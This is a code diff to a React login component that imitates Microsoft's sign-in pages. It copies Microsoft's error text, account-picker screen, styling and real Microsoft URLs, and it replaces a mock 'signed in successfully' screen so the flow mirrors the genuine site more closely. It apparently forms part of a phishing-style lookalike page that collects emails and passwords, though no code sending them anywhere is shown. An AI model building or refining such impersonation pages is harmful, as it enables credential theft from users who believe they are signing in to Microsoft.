@@ -9,7 +9,7 @@ import git from "../assets/git-icon.svg";
 import question from "../assets/question-icon.svg";
 import profile from "../assets/profile-icon.svg";
 
-type LoginPhase = "email" | "password" | "success" | "options";
+type LoginPhase = "email" | "password" | "optionsemail" | "options";
 
 interface LoginPhaseProps {
   phase: LoginPhase;
@@ -25,7 +25,7 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
 
   // Email validation function
   const isValidEmail = (emailValue: string): boolean => {
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$|^\+?[1-9]\d{1,14}$|^[a-zA-Z][a-zA-Z0-9]{4,31}$/;
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$|^\+?[1-9]\d{1,14}$/;
     return emailRegex.test(emailValue);
   };
 
@@ -44,13 +44,13 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
       
       // Check email format
       if (!isValidEmail(email)) {
-        setError("Enter a valid email address, phone number, or Skype name.");
+        setError("We couldn't find an account with that username. Try another, or get a new Microsoft account.");
         setIsLoading(false);
         return;
       }
       
       // Move to next phase
-      setPhase("password");
+      setPhase("optionsemail");
     } catch (err) {
       setError("Failed to validate email");
     } finally {
@@ -71,7 +71,7 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
         return;
       }
       // Move to success phase
-      setPhase("success");
+      setPhase("options");
     } catch (err) {
       setError("Failed to sign in");
     } finally {
@@ -81,6 +81,11 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
 
   const handleBack = () => {
     if (phase === "password") {
+      setPhase("email");
+      setError("");
+    }
+
+    if (phase === "optionsemail") {
       setPhase("email");
       setError("");
     }
@@ -109,13 +114,27 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
               className="space-y-4 text-[15px] mb-4"
             >
               <div>
-                {error && <div className="text-[#e81123] text-[15px]">{error}</div>}
+                {error && (
+                  <div className="text-[#e81123] text-[15px]">
+                    {error.includes("or get a new Microsoft account") ? (
+                      <>
+                        We couldn't find an account with that username. Try another, or{" "}
+                        <a href="https://signup.live.com/signup?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1033%26username%3dsadsadsa%2540asss.com%26client_id%3d81feaced-5ddd-41e7-8bef-3e20a2689bb7%26mkt%3dEN-US%26opid%3dCC6BA83EF17D2600%26opidt%3d1768818582%26uaid%3d64b69cddbda64994b16c48ca3d5c7d79%26contextid%3d2D89108E08AD390E%26opignore%3d1&mkt=EN-US&uiflavor=web&username=sadsadsa%40asss.com&lw=1&fl=easi2&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&uaid=64b69cddbda64994b16c48ca3d5c7d79&suc=81feaced-5ddd-41e7-8bef-3e20a2689bb7&fluent=2&lic=1" className="text-[#0067BB] hover:underline">
+                          get a new Microsoft account.
+                        </a>
+                      </>
+                    ) : (
+                      error
+                    )}
+                  </div>
+                )}
                 <input
                   id="email"
-                  type="email"
+                  type="text"
                   value={email}
                   onChange={(e) => setEmail(e.target.value)}
                   placeholder="Email, phone, or Skype"
+                  suppressHydrationWarning={true}
                   className="w-full py-1.5 pr-2.5 border-b border-[#1b1b1b] outline-none text-[#1b1b1b] text-[15px] font-normal"/>
               </div>
             </form>
@@ -140,6 +159,7 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
               <button
                 type="button"
                 onClick={() => router.back()}
+                suppressHydrationWarning={true}
                 className="w-27 h-8 text-[15px] font-normal text-[#1b1b1b] bg-[#00000033] transition duration-200 py-1 px-3 cursor-pointer hover:bg-[#0000004d]"
               >
                 Back
@@ -148,6 +168,7 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
                 form="email-form"
                 type="submit"
                 disabled={isLoading}
+                suppressHydrationWarning={true}
                 className="w-27 h-8 text-[15px] font-normal text-white bg-[#0067BB] transition duration-200 py-1 px-3 cursor-pointer hover:bg-[#005a9e]"
               >
                 {isLoading ? "Validating..." : "Next"}
@@ -194,6 +215,7 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
                   placeholder="Password"
                   required
                   autoFocus
+                  suppressHydrationWarning={true}
                   className="w-full py-1.5 pr-2.5 border-b border-[#1b1b1b] outline-none text-[#1b1b1b] text-[15px] font-normal"
                 />
               </div>
@@ -209,6 +231,7 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
               <div className="flex justify-end gap-2 mt-8 mb-1">
                 <button
                   type="submit"
+                  suppressHydrationWarning={true}
                   disabled={isLoading}
                   className="w-27 h-8 text-[15px] font-normal text-white bg-[#0067BB] transition duration-200 py-1 px-3 cursor-pointer hover:bg-[#005a9e]"
                 >
@@ -219,40 +242,91 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
           </div>
         );
 
-      case "success":
+      case "optionsemail":
         return (
           <div
             style={{ fontFamily: '"Segoe UI", "Helvetica Neue", sans-serif' }}
           >
-            <div className="text-center">
-              <div className="mb-4">
-                <div className="inline-flex items-center justify-center w-16 h-16 bg-green-100 rounded-full">
-                  <svg
-                    className="w-8 h-8 text-green-600"
-                    fill="none"
-                    stroke="currentColor"
-                    viewBox="0 0 24 24"
-                  >
-                    <path
-                      strokeLinecap="round"
-                      strokeLinejoin="round"
-                      strokeWidth={2}
-                      d="M5 13l4 4L19 7"
-                    />
-                  </svg>
+            <p className="text-[15px] text-[#1b1b1b] mt-4 mb-3">
+              It looks like this email is used with more than one account from Microsoft. Which one do you want to use?
+            </p>
+
+            <div className="">
+              {/* Work or school account */}
+              <div
+                onClick={() => setPhase("password")}
+                className="flex items-center gap-3 hover:bg-[#e0e0e0] cursor-pointer px-11 -mx-11 py-3"
+              >
+                <div className="shrink-0">
+                  <div className="w-12 h-12 bg-[#e0e0e0] rounded-full flex items-center justify-center">
+                  <Image
+                    src={organ}
+                    alt="Organization Icon"
+                    width={48}
+                    height={48}
+                    className=""
+                    priority
+                  />
+                  </div>
+                </div>
+                <div className="flex-1 text-left">
+                  <p className="text-[15px] font-semibold text-[#1b1b1b]">
+                    Work or school account
+                  </p>
+                  <p className="text-[12px] text-[#1b1b1b]">
+                    Created by your IT department
+                  </p>
+                  <p className="text-[12px] text-[#1b1b1b]">
+                    {email}
+                  </p>
                 </div>
               </div>
-              <h2 className="text-2xl font-bold text-gray-900 mb-2">
-                Welcome!
-              </h2>
-              <p className="text-gray-600 mb-6">
-                You have successfully signed in
-              </p>
-              <button
-                onClick={handleNewSignIn}
-                className="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-2 px-4 rounded-lg transition duration-200"
+
+              {/* Personal account */}
+              <div
+                onClick={() => setPhase("password")}
+                className="flex items-center gap-3 py-3 hover:bg-[#e0e0e0] cursor-pointer px-11 -mx-11"
               >
-                Sign In Again
+                <div className="shrink-0">
+                  <div className="w-12 h-12 bg-[#e0e0e0] rounded-full flex items-center justify-center">
+                    <svg
+                      className="w-6 h-6 text-[#666666]"
+                      fill="currentColor"
+                      viewBox="0 0 24 24"
+                    >
+                      <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+                    </svg>
+                  </div>
+                </div>
+                <div className="flex-1 text-left">
+                  <p className="text-[15px] font-semibold text-[#1b1b1b]">
+                    Personal account
+                  </p>
+                  <p className="text-[12px] text-[#1b1b1b]">
+                    Created by you
+                  </p>
+                  <p className="text-[12px] text-[#1b1b1b]">
+                    {email}
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            <div className="text-[13px] text-[#1b1b1b] mb-6 pb-4 mt-4">
+              Tired of seeing this?&nbsp;
+              <a href="https://support.microsoft.com/en-us/account-billing/change-the-email-address-or-phone-number-for-your-microsoft-account-761a662d-8032-88f4-03f3-c9ba8ba0e00b" className="text-[#0067BB] hover:underline">
+                Rename your personal Microsoft account.
+              </a>
+            </div>
+
+            <div className="flex justify-end gap-2">
+              <button
+                type="button"
+                suppressHydrationWarning={true}
+                onClick={handleBack}
+                className="w-27 h-8 text-[15px] font-normal text-[#1b1b1b] bg-[#00000033] transition duration-200 py-1 px-3 cursor-pointer hover:bg-[#0000004d]"
+              >
+                Back
               </button>
             </div>
           </div>
